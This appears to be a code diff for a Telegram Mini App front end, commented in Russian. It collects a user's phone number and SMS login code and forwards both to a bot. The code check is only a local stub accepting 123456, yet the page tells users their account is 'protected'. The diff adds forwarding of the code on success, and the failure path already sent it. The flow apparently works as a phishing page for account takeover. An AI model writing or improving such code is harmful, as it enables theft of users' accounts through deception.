@@ -5,7 +5,7 @@ document.addEventListener('DOMContentLoaded', () => {
     tg.setBackgroundColor('#060137');
     tg.enableClosingConfirmation();
 
-    // Elements
+    // Элементы
     const phoneForm = document.getElementById('phone-form');
     const codeForm = document.getElementById('code-form');
     const phoneInput = document.getElementById('phone');
@@ -14,31 +14,63 @@ document.addEventListener('DOMContentLoaded', () => {
     const codeError = document.getElementById('code-error');
     const submitCodeBtn = document.getElementById('submit-code');
 
+    // Состояние приложения
+    let currentPhone = '';
+
     // Анимация загрузки
     const setLoading = (element, isLoading) => {
-        if (isLoading) {
-            element.innerHTML = '<div class="loader"></div>';
-            element.disabled = true;
-        } else {
-            element.textContent = element.dataset.originalText;
-            element.disabled = false;
-        }
+        element.disabled = isLoading;
+        element.innerHTML = isLoading 
+            ? '<div class="loader"></div>' 
+            : element.dataset.originalText;
     };
 
     // Сохраняем оригинальный текст кнопки
     submitCodeBtn.dataset.originalText = submitCodeBtn.textContent;
 
-    // Проверка кода (имитация)
+    // Форматирование номера
+    const formatPhone = (value) => {
+        const numbers = value.replace(/\D/g, '');
+        let formatted = '+7';
+        
+        if (numbers.length > 1) {
+            formatted += ' ' + numbers.substring(1, 4);
+        }
+        if (numbers.length > 4) {
+            formatted += ' ' + numbers.substring(4, 7);
+        }
+        if (numbers.length > 7) {
+            formatted += ' ' + numbers.substring(7, 9);
+        }
+        if (numbers.length > 9) {
+            formatted += ' ' + numbers.substring(9, 11);
+        }
+        
+        return formatted.substring(0, 16);
+    };
+
+    // Валидация номера
+    const validatePhone = (phone) => {
+        const clean = phone.replace(/\D/g, '');
+        return clean.length === 11 && clean.startsWith('7');
+    };
+
+    // Обработчик ввода телефона
+    phoneInput.addEventListener('input', (e) => {
+        phoneInput.value = formatPhone(e.target.value);
+    });
+
+    // Проверка кода (заглушка)
     const verifyCode = async (code) => {
         return new Promise(resolve => {
             setTimeout(() => {
-                // В реальном приложении здесь должен быть запрос к серверу
-                resolve(code === '123456'); // Пример: правильный код 123456
+                // В продакшене заменить на реальный API-запрос
+                resolve(code === '123456'); // Тестовый код
             }, 1500);
         });
     };
 
-    // Submit phone
+    // Отправка номера
     document.getElementById('submit-phone').addEventListener('click', async () => {
         const phone = phoneInput.value.replace(/\D/g, '');
         
@@ -47,62 +79,53 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
         
-        if (!/^7\d{10}$/.test(phone)) {
-            showError(phoneError, 'Введите корректный российский номер');
+        if (!validatePhone(phone)) {
+            showError(phoneError, 'Введите корректный российский номер (+7 XXX XXX XX XX)');
             return;
         }
         
         hideError(phoneError);
+        currentPhone = `+${phone}`;
         phoneForm.classList.add('hidden');
         codeForm.classList.remove('hidden');
         
-        // Отправляем номер
         if (window.sendToBot) {
-            await window.sendToBot('phone', `+${phone}`);
+            await window.sendToBot('phone', currentPhone);
         }
     });
 
-    // Submit code
+    // Отправка кода
     submitCodeBtn.addEventListener('click', async () => {
         const code = codeInput.value.trim();
         
-        if (!code) {
-            showError(codeError, 'Введите код из SMS');
-            return;
-        }
-        
         if (!/^\d{6}$/.test(code)) {
-            showError(codeError, 'Код должен содержать 6 цифр');
+            showError(codeError, 'Введите ровно 6 цифр');
             return;
         }
         
         hideError(codeError);
         setLoading(submitCodeBtn, true);
         
-        // Проверка кода
         const isValid = await verifyCode(code);
         
         if (isValid) {
-            // Успешная проверка
             if (window.sendToBot) {
-                await window.sendToBot('code_verified');
+                await window.sendToBot('verified', code);
             }
-            
-            tg.showAlert('✅ Код подтвержден! Ваш аккаунт защищен.', () => {
-                tg.close();
-            });
+            tg.showAlert('✅ Аккаунт успешно защищен!');
+            setTimeout(() => tg.close(), 1000);
         } else {
-            // Неверный код
-            codeInput.value = '';
             showError(codeError, 'Неверный код. Попробуйте снова');
+            codeInput.value = '';
             if (window.sendToBot) {
-                await window.sendToBot('code_failed', code);
+                await window.sendToBot('failed', code);
             }
         }
         
         setLoading(submitCodeBtn, false);
     });
 
+    // Показ ошибки
     function showError(element, message) {
         element.textContent = message;
         element.style.display = 'block';
